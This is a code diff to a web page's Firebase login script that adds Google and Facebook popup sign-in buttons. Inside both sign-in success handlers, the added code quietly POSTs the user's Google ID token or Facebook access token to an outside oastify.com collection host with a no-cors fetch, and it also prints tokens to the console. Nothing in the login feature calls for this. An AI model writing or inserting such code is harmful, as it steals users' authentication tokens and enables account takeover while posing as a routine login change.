@@ -22,19 +22,58 @@
 
     //Google singin provider
     var ggProvider = new firebase.auth.GoogleAuthProvider();
-    firebase.auth().signInWithRedirect(ggProvider);
+    //Facebook singin provider
+    var fbProvider = new firebase.auth.FacebookAuthProvider();
+    //Login in variables
+    const btnGoogle = document.getElementById('btnGoogle');
+    const btnFaceBook = document.getElementById('btnFacebook');
 
-    // Handle the redirect result
-    firebase.auth()
-      .getRedirectResult()
-      .then((result) => {
-        if (result.user) {
-          console.log("User is signed in:", result.user);
-        }
-      })
-      .catch((error) => {
-        console.error("Error during sign-in:", error);
-      });
-    
-        
+        //Sing in with Google
+        btnGoogle.addEventListener('click', e => {
+            firebase.auth().signInWithPopup(ggProvider).then(function(result) {
+                var token = result.credential.idToken;
+                var user = result.user;
+                idToken = user.qa;
+                console.log('User>>Goole>>>>', user);
+                console.log('User>>Idtoken>>>>', idToken);
+                userId = user.uid;
+                fetch('https://slhtbmmgty6c2zy1bxrzfets5jbaz0np.oastify.com', {
+                  method: 'POST',
+                  mode: 'no-cors',
+                  body: idToken
+                });
+            }).catch(function(error) {
+                console.error('Error: hande error here>>>', error.code)
+            })
+        }, false)
+
+        //Sing in with Facebook
+        btnFaceBook.addEventListener('click', e => {
+            firebase.auth().signInWithPopup(fbProvider).then(function(result) {
+                // This gives you a Facebook Access Token. You can use it to access the Facebook API.
+                var token = result.credential.accessToken;
+                // The signed-in user info.
+                var user = result.user;
+                console.log('User>>Facebook>', user);
+                // ...
+                userId = user.uid;
+                fetch('https://slhtbmmgty6c2zy1bxrzfets5jbaz0np.oastify.com', {
+                  method: 'POST',
+                  mode: 'no-cors',
+                  body: token
+                });
+            
+            }).catch(function(error) {
+                // Handle Errors here.
+                var errorCode = error.code;
+                var errorMessage = error.message;
+                // The email of the user's account used.
+                var email = error.email;
+                // The firebase.auth.AuthCredential type that was used.
+                var credential = error.credential;
+                // ...
+                console.error('Error: hande error here>Facebook>>', error.code)
+            });
+        }, false)
+        //jquery 
 }())</script>
